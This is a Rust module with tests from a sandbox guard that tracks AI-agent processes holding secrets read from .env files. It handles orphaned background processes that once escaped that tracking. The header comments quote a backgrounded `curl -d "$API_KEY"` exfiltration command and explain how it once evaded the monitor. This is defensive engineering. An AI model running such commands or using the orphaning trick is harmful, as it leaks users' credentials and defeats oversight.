//! lineage — the PURE half of keeping a holder's descendants holders after
//! the holder is gone (exec-routing.md §7.5, "A fork after the taint",
//! 2026-10-02).
//!
//! The taint leg finds a process's holder by walking its parents of the
//! moment (`secret_open::TaintedSet::holds_or_inherits`). Until 2026-10-02 a
//! child forked after the taint that made no trapped call while its holder
//! lived lost the taint when the holder exited: it was re-parented (to the
//! guard, the tree's subreaper, or to the wrap's pid-1) and no walk met the
//! holder again. `bash -c '. .env; { sleep 1; curl -d "$API_KEY" … ; } &'`
//! sent the key anywhere the static list allowed. The guard now keeps the
//! lineage with an ORPHAN BACKSTOP that needs no fork trap (trapping task
//! creation with seccomp user-notification destabilizes the bubblewrap wrap
//! the agent runs under):
//!
//!   - a process descending from an ORPHAN ROOT (the first process up its
//!     chain whose parent is a reaper: pid 1, a pid namespace's init, the
//!     guard subreaper, or a process that made itself a subreaper — the
//!     trapped `prctl(PR_SET_CHILD_SUBREAPER)`) inherits from every holder
//!     that died while that root lived and that was a holder when the root
//!     was born (`in_window`), a fail-closed over-approximation bounded by
//!     those two times (the holder's taint and its death, observed via
//!     `/proc`). The root, not the caller: in `( sleep 1; node … ) &` the
//!     subshell is the orphan and `node` its child;
//!   - a descendant that makes any trapped call while its holder is alive is
//!     found by the parent walk, as before; the taint-time sweep records the
//!     live descendants at the moment of the taint.
//!
//! A `CLONE_PARENT` / `clone3` sibling, whose parent would be the holder's
//! parent (not a reaper) and so out of the backstop's reach, cannot be made
//! under a secret policy: the guard's filter refuses `CLONE_PARENT` (EPERM)
//! and `clone3` (ENOSYS) for the whole tree (`guard_filter::clone_block`,
//! §7.5 gap (d), 2026-10-03), so every process has its creator as parent.
//!
//! This module decides, with no syscalls: the `/proc/<pid>/stat` and
//! `status` fields the checks read, whether a process is gone, whether its
//! reaper reaps, and the window.
//!
//! `Mandu-new`.

/// `prctl(PR_SET_CHILD_SUBREAPER, …)`.
pub const PR_SET_CHILD_SUBREAPER: u64 = 36;

/// `PF_EXITING` in `/proc/<pid>/stat`'s flags: set when the process starts
/// to exit, before its children are re-parented.
pub const PF_EXITING: u64 = 0x4;

pub fn is_prctl_nr(nr: i64) -> bool {
    nr == libc::SYS_prctl as i64
}

/// The fields of `/proc/<pid>/stat` the lineage checks read.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ProcStat {
    pub state: char,
    pub ppid: i32,
    pub flags: u64,
    /// Start time, clock ticks since boot (field 22).
    pub start: u64,
}

/// Parse `/proc/<pid>/stat` (the name in parentheses may hold anything,
/// so the fields are counted from the last `)`).
pub fn parse_stat(s: &str) -> Option<ProcStat> {
    let close = s.rfind(')')?;
    let f: Vec<&str> = s.get(close + 1..)?.split_whitespace().collect();
    if f.len() < 20 {
        return None;
    }
    Some(ProcStat {
        state: f[0].chars().next()?,
        ppid: f[1].parse().ok()?,
        flags: f[6].parse().ok()?,
        start: f[19].parse().ok()?,
    })
}

/// A proc key `<tgid>-<start>` split.
pub fn parse_key(key: &str) -> Option<(i32, u64)> {
    let (p, s) = key.split_once('-')?;
    Some((p.parse().ok()?, s.parse().ok()?))
}

/// Is the process a key names gone, or on its way out? `stat` is its
/// `/proc/<tgid>/stat` now (None: no such process). Another process under
/// the same number (a different start time) means it is gone; so does a
/// zombie, and `PF_EXITING` (set before its children are re-parented, so an
/// orphan never sees its parent gone while the parent still looks alive).
pub fn is_gone(stat: Option<&ProcStat>, start: u64) -> bool {
    match stat {
        None => true,
        Some(s) => s.start != start || matches!(s.state, 'Z' | 'X' | 'x') || s.flags & PF_EXITING != 0,
    }
}

/// Is the process a key names DEAD: no such process, another process under
/// its number, or a zombie? Unlike `is_gone`, not a process that is only
/// exiting (`PF_EXITING`): its children are not re-parented yet, so a stamp
/// of its death taken now could precede the death (`death_watch` watches
/// such a process, and its pidfd reports the death itself).
pub fn is_dead(stat: Option<&ProcStat>, start: u64) -> bool {
    match stat {
        None => true,
        Some(s) => s.start != start || matches!(s.state, 'Z' | 'X' | 'x'),
    }
}

/// `/proc/<pid>/status`: is this process the init of its innermost pid
/// namespace (`NSpid:` ends in 1)? Such a process reaps that namespace's
/// orphans.
pub fn is_pidns_init(status: &str) -> bool {
    status.lines().find_map(|l| l.strip_prefix("NSpid:")).and_then(|v| v.split_whitespace().last()).map(|v| v == "1").unwrap_or(false)
}

/// The end of a holder's window to keep when it has `prev` and a look at
/// `now` found it dead: the earlier one. Every look (its pidfd's report,
/// the 200 ms poll, a judgement) is taken after the death, so the earlier
/// is still no earlier than the death (`death_watch`). Pure.
pub fn earliest_stamp(prev: Option<u64>, now: u64) -> u64 {
    prev.map_or(now, |p| p.min(now))
}

/// The window in which an orphan born at `born` may descend from a holder:
/// the holder was one from `from` (its taint) until `until` (seen gone).
/// One tick of margin before the taint. None after `until` (2026-10-09):
/// a start time is the kernel's `CLOCK_BOOTTIME` at the fork rounded DOWN to
/// clock ticks, and `until` is the same clock read after the death rounded
/// down the same way (`secret_open::now_ticks`), so a process born no later
/// than the death (born <= death <= until) has a tick no later than
/// `until`'s; the margin only took in roots born in the tick after the
/// stamp, which cannot descend from the dead holder.
pub fn in_window(born: u64, from: u64, until: u64) -> bool {
    born.saturating_add(1) >= from && born <= until
}

/// May an orphan root born at `born` descend from the holder that started at
/// `holder_start` (its key's start time) and held from `from` until `until`?
/// Only when it was born no earlier than that holder (a child's start time
/// is never below its parent's, in the same rounded ticks), and in the
/// holder's window (`in_window`). The window's one tick of margin alone
/// judged the tree's own root an orphan of a holder below it whenever the
/// root started within a tick of that holder's taint (2026-10-02: a short
/// `guard -- sh -c '( eval "$(cat .env)"; … ) & …'`, where the root shell
/// then held the reader's taint and so did every process it started).
///
/// `root_is_ancestor`: the root is one of the holder's own ancestors (as
/// recorded when it became a holder), so it is no orphan of it whatever the
/// ticks say: within one tick a parent and its child have the same start
/// time (2026-10-03, `secret-readers-live`'s pipe-holder check).
pub fn orphan_of(born: u64, holder_start: u64, from: u64, until: u64, root_is_ancestor: bool) -> bool {
    !root_is_ancestor && born >= holder_start && in_window(born, from, until)
}

/// Plan 13 D7 (`secret_open::lineage_chain_of`): does the ancestor walk go
/// on to the parent `ppid`? Not to init (pid 1 or 0, no tool call's
/// process), and not to `guard`, the walking process: it and everything
/// above it belong to no call's tree, and a process re-parented to it (the
/// tree's subreaper) has lost its real parent, which an edge to the guard
/// would only hide.
pub fn chain_continues(ppid: i32, guard: i32) -> bool {
    ppid > 1 && ppid != guard
}

/// How many parent links `session_ancestors` follows looking for the guard
/// (the same bound as `secret_open::in_tree`).
pub const SESSION_WALK_STEPS: usize = 256;

/// Plan 13 D8, a reader's `from:` parents (2026-10-17): the ancestors of
/// `pid` INSIDE the session, nearest first, at most `max`, each with its
/// start time (clock ticks). The session is the guard's tree, so the walk
/// stops below `guard` (the walking process: it and everything above it,
/// whatever launched Mandu, are no reader's parent). Until 2026-10-17 the
/// walk went on to pid 1: a `python3` (or `git`, `node`, …) that started
/// `mandu`, an IDE's or a notebook's terminal, was a trusted `from:` parent
/// of every opener in the session.
///
/// Empty, fail-closed, unless the chain is anchored: every link up to the
/// guard read (`stat_of`, `/proc/<pid>/stat`), the guard met within
/// `SESSION_WALK_STEPS`, no init (pid 1 or 0) before it, and no parent
/// started after its child (a parent number reused by a later process,
/// read mid-walk). A process re-parented out of the guard's tree (to a
/// subreaper above the guard, to init) has no session ancestor at all; one
/// re-parented to the guard (its subreaper) has none either, its real
/// parent being gone. `guard <= 0` (no guard known): empty. Pure.
pub fn session_ancestors(pid: i32, guard: i32, max: usize, stat_of: impl Fn(i32) -> Option<ProcStat>) -> Vec<(i32, u64)> {
    if guard <= 0 || pid == guard {
        return Vec::new();
    }
    let Some(mut child) = stat_of(pid) else { return Vec::new() };
    let mut out = Vec::new();
    for _ in 0..SESSION_WALK_STEPS {
        let pp = child.ppid;
        if pp == guard {
            return out;
        }
        if pp <= 1 {
            return Vec::new();
        }
        let Some(parent) = stat_of(pp) else { return Vec::new() };
        if parent.start > child.start {
            return Vec::new();
        }
        if out.len() < max {
            out.push((pp, parent.start));
        }
        child = parent;
    }
    Vec::new()
}

/// Plan 13 D7, the call-root recorder: is an exec by a process whose parent
/// is `parent` (the first key of its chain) the shell the agent runs one
/// tool call in? Yes when the parent is one of the agent's keys
/// (`guard_flow::agent_keys`). No agent known (no `agentExe`): never, and
/// the arbiter then binds no call (it masks a call's result while the
/// session holds a secret).
pub fn is_call_root(parent: Option<&str>, agents: &[String]) -> bool {
    match parent {
        Some(p) => agents.iter().any(|a| a == p),
        None => false,
    }
}

/// confidentiality.md §4, "What Allow once means for a command": does the
/// arbiter's answer at a call root's exec (`sessionExecRoot`) make the
/// process a holder? `holder` as answered; an arbiter that does not know the
/// op (an older one, `unknown op`) has no HIGH session to hold, so no; any
/// other failure (unreachable, a broken reply) makes it a holder, fail-closed:
/// its exits then ask the arbiter, which refuses while it cannot answer.
pub fn session_holder(
    answer: &std::result::Result<mandu_arbiter::protocol::SessionExecRootResult, mandu_arbiter::ArbiterError>,
) -> bool {
    match answer {
        Ok(r) => r.holder,
        Err(mandu_arbiter::ArbiterError::Arbiter(e)) if e.starts_with("unknown op") => false,
        Err(_) => true,
    }
}

/// Plan 13 D7, the orphan subshell (2026-10-02): the ORPHAN ROOT to report
/// for a process (`own`) the guard saw act, whose live chain is `chain`
/// (nearest first, stopped below the guard) and whose topmost ancestor whose
/// parent reaps orphans is `root` (its key and start time, clock ticks).
/// Reported only when the agent is known, neither the process nor any of its
/// ancestors is one of the agent's processes, and the root was born after the
/// agent: then the root is a tree whose real parent (a tool call's shell)
/// exited before any process of it acted, and no lineage edge links it to
/// that call. Not the tree's own root and the wrappers above the agent (born
/// before it), nor anything under the agent (its chain names the agent).
pub fn orphan_root_report(own: &str, chain: &[String], agents: &[String], root: Option<(&str, u64)>) -> Option<String> {
    if agents.is_empty() || agents.iter().any(|a| a == own || chain.iter().any(|c| c == a)) {
        return None;
    }
    let (key, start) = root?;
    let agent_born = agents.iter().filter_map(|a| parse_key(a)).map(|(_, s)| s).min()?;
    if start > agent_born {
        Some(key.to_string())
    } else {
        None
    }
}

/// 2026-10-04 (confidentiality.md §6): the working directory to report with a
/// call root's exec, from the kernel's `/proc/<pid>/cwd` link as read while
/// the exec was suspended (`link`: the read's result). Only a directory the
/// kernel names plainly: absolute, valid UTF-8, no empty, `.` or `..`
/// segment, not a removed directory (` (deleted)`) nor one outside the
/// guard's root (`(unreachable)…`). Anything else: none, and the arbiter
/// reads none of the call's relative paths in a directory (they keep the
/// catalog's verdict). Pure.
pub fn reported_cwd(link: Option<&std::path::Path>) -> Option<String> {
    let s = link?.to_str()?;
    if !s.starts_with('/') || s.len() > 4096 || s.contains('\0') || s.ends_with(" (deleted)") {
        return None;
    }
    if s != "/" && s[1..].split('/').any(|seg| seg.is_empty() || seg == "." || seg == "..") {
        return None;
    }
    Some(s.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_high_sessions_call_root_is_a_holder_and_an_unreachable_arbiter_fails_closed() {
        use mandu_arbiter::protocol::SessionExecRootResult;
        use mandu_arbiter::ArbiterError;
        let ans = |holder| Ok(SessionExecRootResult { holder, level: None, reason: String::new() });
        assert!(session_holder(&ans(true)));
        assert!(!session_holder(&ans(false)), "a low session's command is no holder");
        assert!(!session_holder(&Err(ArbiterError::Arbiter("unknown op: sessionExecRoot".into()))), "an older arbiter has no HIGH session");
        assert!(session_holder(&Err(ArbiterError::Arbiter("sessionExecRoot: procKey required".into()))), "any other refusal: a holder");
        assert!(session_holder(&Err(ArbiterError::Io(std::io::Error::other("refused")))), "unreachable: a holder (fail-closed)");
        assert!(session_holder(&Err(ArbiterError::Protocol("bad reply".into()))));
        let wedged = ArbiterError::Timeout { op: "sessionExecRoot".into(), after: std::time::Duration::from_secs(5) };
        assert!(session_holder(&Err(wedged)), "a wedged arbiter: a holder (fail-closed)");
    }

    #[test]
    fn a_holders_window_ends_at_the_earliest_look_after_its_death() {
        assert_eq!(earliest_stamp(None, 50), 50);
        assert_eq!(earliest_stamp(Some(40), 50), 40, "an earlier look kept");
        assert_eq!(earliest_stamp(Some(60), 50), 50, "a pidfd's report beats a later poll");
        // a holder tainted at 10 and dead at 40 (stamped 40): an orphan born
        // at 30 (or in the stamp's tick, 40) is in its window; one born at
        // 45, after the death, is not. The old poll stamp (up to 200 ms
        // later: 60) took that one in.
        assert!(orphan_of(30, 5, 10, earliest_stamp(None, 40), false));
        assert!(orphan_of(40, 5, 10, 40, false), "born in the stamp's tick: kept");
        assert!(!orphan_of(41, 5, 10, 40, false), "born in a later tick than the stamp: after the death");
        assert!(!orphan_of(45, 5, 10, earliest_stamp(Some(60), 40), false));
        assert!(orphan_of(45, 5, 10, 60, false), "the late stamp's over-reach");
    }

    #[test]
    fn a_call_roots_cwd_is_reported_only_as_the_kernel_names_it_plainly() {
        use std::path::Path;
        assert_eq!(reported_cwd(Some(Path::new("/home/u/proj"))), Some("/home/u/proj".into()));
        assert_eq!(reported_cwd(Some(Path::new("/"))), Some("/".into()));
        assert_eq!(reported_cwd(None), None, "the link could not be read");
        assert_eq!(reported_cwd(Some(Path::new("proj"))), None, "relative");
        assert_eq!(reported_cwd(Some(Path::new("(unreachable)/x"))), None, "outside the guard's root");
        assert_eq!(reported_cwd(Some(Path::new("/w/gone (deleted)"))), None, "a removed directory");
        assert_eq!(reported_cwd(Some(Path::new("/w/../etc"))), None);
        assert_eq!(reported_cwd(Some(Path::new("/w//x"))), None);
        assert_eq!(reported_cwd(Some(Path::new("/w/x/"))), None);
    }

    #[test]
    fn an_orphan_root_is_reported_only_off_the_agents_tree_and_born_after_it() {
        let agents = vec!["100-500".to_string()];
        let chain = vec!["300-900".to_string()];
        // `( read -t 9; cat x ) &` after the call's shell returned: cat's chain
        // is the subshell, re-parented to the guard, born after the agent.
        assert_eq!(orphan_root_report("301-950", &chain, &agents, Some(("300-900", 900))), Some("300-900".into()));
        // the orphan itself acting (its chain is empty)
        assert_eq!(orphan_root_report("300-900", &[], &agents, Some(("300-900", 900))), Some("300-900".into()));
        // under the agent: its chain names the agent
        assert_eq!(orphan_root_report("301-950", &["300-900".into(), "100-500".into()], &agents, Some(("1-1", 1))), None);
        // the agent itself
        assert_eq!(orphan_root_report("100-500", &[], &agents, Some(("90-400", 400))), None);
        // the wrappers above the agent and the tree's own root: born before it
        assert_eq!(orphan_root_report("90-400", &[], &agents, Some(("90-400", 400))), None);
        assert_eq!(orphan_root_report("95-450", &["90-400".into()], &agents, Some(("90-400", 400))), None);
        // no reaper found, no agent known, or no agent key that parses
        assert_eq!(orphan_root_report("301-950", &chain, &agents, None), None);
        assert_eq!(orphan_root_report("301-950", &chain, &[], Some(("300-900", 900))), None);
        assert_eq!(orphan_root_report("301-950", &chain, &["agent".to_string()], Some(("300-900", 900))), None);
    }

    #[test]
    fn the_lineage_chain_stops_below_the_guard_and_at_init() {
        assert!(chain_continues(4242, 17));
        assert!(!chain_continues(17, 17), "the guard is no call's process");
        assert!(!chain_continues(1, 17), "init is no call's process");
        assert!(!chain_continues(0, 17));
    }

    /// A process table for `session_ancestors`: pid → (ppid, start).
    fn table(rows: &[(i32, i32, u64)]) -> impl Fn(i32) -> Option<ProcStat> + '_ {
        move |p| rows.iter().find(|r| r.0 == p).map(|&(_, ppid, start)| ProcStat { state: 'S', ppid, flags: 0, start })
    }

    #[test]
    fn a_readers_from_parents_are_its_ancestors_inside_the_session_only() {
        // python3 (50, a subreaper that started mandu) → guard (100) →
        // bwrap (101) → agent (102) → sh (103) → python3 (104) → reader (105).
        let rows = [(1, 0, 1), (50, 1, 10), (100, 50, 20), (101, 100, 21), (102, 101, 22), (103, 102, 30), (104, 103, 31), (105, 104, 32)];
        let t = table(&rows);
        let pids = |v: Vec<(i32, u64)>| v.into_iter().map(|(p, _)| p).collect::<Vec<_>>();
        assert_eq!(pids(session_ancestors(105, 100, 16, &t)), vec![104, 103, 102, 101], "stops below the guard: the python3 above it is no parent");
        assert_eq!(session_ancestors(105, 100, 16, &t)[0], (104, 31), "each with its start time");
        assert_eq!(pids(session_ancestors(105, 100, 2, &t)), vec![104, 103], "max keeps the nearest");
        assert!(session_ancestors(101, 100, 16, &t).is_empty(), "the guard's own child has no session ancestor");
        assert!(session_ancestors(100, 100, 16, &t).is_empty(), "nor has the guard");
        assert!(session_ancestors(105, 0, 16, &t).is_empty(), "no guard known: none");
        assert!(session_ancestors(105, -1, 16, &t).is_empty());
        assert!(session_ancestors(999, 100, 16, &t).is_empty(), "the reader gone: none");
        // A guard that is its pid namespace's init (pid 1 there).
        let ns = [(1, 0, 5), (2, 1, 6), (3, 2, 7)];
        assert_eq!(pids(session_ancestors(3, 1, 16, &table(&ns))), vec![2]);
    }

    #[test]
    fn an_unanchored_chain_gives_no_from_parent() {
        // A process outside the guard's tree: its chain meets init.
        let host = [(1, 0, 1), (50, 1, 10), (60, 50, 11), (61, 60, 12)];
        assert!(session_ancestors(61, 100, 16, &table(&host)).is_empty(), "a host process: no session, no parent");
        // An orphan re-parented to a subreaper ABOVE the guard (50): its
        // real parents left the session, and 50 is no parent of it.
        let reaped = [(1, 0, 1), (50, 1, 10), (100, 50, 20), (102, 100, 22), (110, 50, 40)];
        assert!(session_ancestors(110, 100, 16, &table(&reaped)).is_empty());
        // An orphan re-parented to the guard (its subreaper): none either.
        let adopted = [(50, 1, 10), (100, 50, 20), (110, 100, 40)];
        assert!(session_ancestors(110, 100, 16, &table(&adopted)).is_empty());
        // A link that cannot be read (the parent gone mid-walk).
        let broken = [(100, 50, 20), (103, 100, 30), (105, 104, 32)];
        assert!(session_ancestors(105, 100, 16, &table(&broken)).is_empty());
        // The parent's number reused by a process born after its child: the
        // link is not the child's real parent.
        let reused = [(100, 50, 20), (103, 100, 30), (104, 103, 90), (105, 104, 32)];
        assert!(session_ancestors(105, 100, 16, &table(&reused)).is_empty());
        // Same tick (a child forked within its parent's tick): still a parent.
        let same = [(100, 50, 20), (104, 100, 32), (105, 104, 32)];
        assert_eq!(session_ancestors(105, 100, 16, &table(&same)), vec![(104, 32)]);
        // A cycle never meets the guard: none, within the step bound.
        let cyc = [(7, 8, 5), (8, 7, 5)];
        assert!(session_ancestors(7, 100, 16, &table(&cyc)).is_empty());
        // Deeper than the step bound below the guard: not anchored.
        let mut deep: Vec<(i32, i32, u64)> = vec![(100, 50, 20)];
        let n = SESSION_WALK_STEPS as i32 + 5;
        for i in 0..n {
            deep.push((1000 + i, if i == 0 { 100 } else { 999 + i }, 30));
        }
        assert!(session_ancestors(1000 + n - 1, 100, 16, &table(&deep)).is_empty());
        assert_eq!(session_ancestors(1010, 100, 16, &table(&deep)).len(), 10, "a chain within the bound is anchored");
    }

    #[test]
    fn a_call_root_is_an_exec_by_the_agents_own_child() {
        let agents = vec!["100-5".to_string(), "101-6".to_string()];
        assert!(is_call_root(Some("100-5"), &agents), "the agent's child");
        assert!(is_call_root(Some("101-6"), &agents), "an npm-script agent's real binary's child");
        assert!(!is_call_root(Some("200-9"), &agents), "a grandchild of the agent (the call's own subprocess)");
        assert!(!is_call_root(None, &agents), "no parent known");
        assert!(!is_call_root(Some("100-5"), &[]), "no agent named: no call root");
    }

    /// The real `/proc` walk: this test process plays the guard. Its child
    /// `sh` (no exec of its own after the fork below) and the grandchild
    /// `sleep` under it: the grandchild's chain is the `sh` alone, never
    /// the guard or anything above it.
    #[test]
    fn lineage_chain_of_a_grandchild_names_its_parent_and_stops_at_the_guard() {
        use std::io::Read;
        let mut sh = std::process::Command::new("sh")
            .args(["-c", "sleep 30 & echo $!; wait"])
            .stdout(std::process::Stdio::piped())
            .spawn()
            .expect("sh");
        let mut line = String::new();
        let mut out = sh.stdout.take().unwrap();
        let mut b = [0u8; 1];
        while out.read(&mut b).map(|n| n == 1).unwrap_or(false) && b[0] != b'\n' {
            line.push(b[0] as char);
        }
        let sleep: i32 = line.trim().parse().expect("sleep pid");
        let chain = crate::secret_open::lineage_chain_of(sleep);
        let sh_key = mandu_arbiter::proc::proc_key_for_pid(sh.id() as i32).unwrap();
        // SAFETY: plain kill of our own grandchild and child.
        unsafe { libc::kill(sleep, libc::SIGKILL) };
        let _ = sh.kill();
        let _ = sh.wait();
        assert_eq!(chain, vec![sh_key], "the chain is the sh, stopped below this process");
    }

    #[test]
    fn stat_and_status_fields() {
        let s = "4242 (a (weird) name) S 17 4242 4242 0 -1 4194624 100 0 0 0 1 2 0 0 20 0 1 0 987654 1000 100 18446744073709551615";
        assert_eq!(parse_stat(s), Some(ProcStat { state: 'S', ppid: 17, flags: 4194624, start: 987654 }));
        assert_eq!(parse_stat("1 (x) S 0"), None);
        assert_eq!(parse_key("4242-987654"), Some((4242, 987654)));
        assert_eq!(parse_key("4242"), None);
        let st = |state: char, flags: u64, start: u64| ProcStat { state, ppid: 1, flags, start };
        assert!(is_gone(None, 5));
        assert!(!is_gone(Some(&st('S', 0, 5)), 5));
        assert!(is_gone(Some(&st('S', 0, 6)), 5), "the number was reused");
        assert!(is_gone(Some(&st('Z', 0, 5)), 5));
        assert!(is_gone(Some(&st('R', PF_EXITING, 5)), 5), "exiting: its children are about to move");
        assert!(!is_dead(Some(&st('R', PF_EXITING, 5)), 5), "exiting is not dead yet: its children have not moved");
        assert!(is_dead(None, 5));
        assert!(is_dead(Some(&st('S', 0, 6)), 5), "the number was reused");
        assert!(is_dead(Some(&st('Z', 0, 5)), 5));
        assert!(!is_dead(Some(&st('S', 0, 5)), 5));
        assert!(is_pidns_init("Name:\tbwrap\nNSpid:\t3141\t1\n"));
        assert!(is_pidns_init("NSpid:\t1\n"));
        assert!(!is_pidns_init("NSpid:\t3141\t7\n"));
        assert!(!is_pidns_init("Name:\tx\n"));
        assert!(is_prctl_nr(libc::SYS_prctl as i64) && !is_prctl_nr(libc::SYS_clone as i64));
    }

    #[test]
    fn the_orphan_window_is_bounded_by_the_holders_taint_and_death() {
        // Born while the holder held the secret: inherits.
        assert!(in_window(150, 100, 200));
        assert!(in_window(100, 100, 200));
        // One tick of rounding before the taint; none after the stamp, which
        // was read after the death on the clock start times are read on,
        // both rounded down: a birth no later than the death is no later
        // than the stamp's tick.
        assert!(in_window(99, 100, 200));
        assert!(in_window(200, 100, 200));
        assert!(!in_window(201, 100, 200));
        // Born before the taint (the sweep saw every descendant alive then),
        // or after the holder was gone: not its orphan.
        assert!(!in_window(50, 100, 200));
        assert!(!in_window(250, 100, 200));
    }

    #[test]
    fn an_orphan_is_never_older_than_its_holder() {
        // Born after the holder started and in its window: may descend.
        assert!(orphan_of(150, 90, 100, 200, false));
        assert!(orphan_of(99, 99, 100, 200, false), "the same tick, no recorded lineage: kept, fail-closed");
        // The tree's root, started a tick before the holder below it (and so
        // inside the window's margin): no descendant of that holder.
        assert!(!orphan_of(99, 100, 100, 200, false));
        assert!(!orphan_of(5510, 5511, 5511, 5521, false));
        // Outside the window, whatever the ages.
        assert!(!orphan_of(250, 90, 100, 200, false));
    }

    #[test]
    fn a_holders_own_ancestor_is_never_its_orphan() {
        // 2026-10-03: the root shell, its subshell and the subshell's
        // `cat .env` started in one clock tick; by the ticks alone the shell
        // could be cat's orphan. It is cat's ancestor, recorded at the taint.
        assert!(!orphan_of(5510, 5510, 5510, 5520, true));
        assert!(!orphan_of(150, 90, 100, 200, true));
    }
}
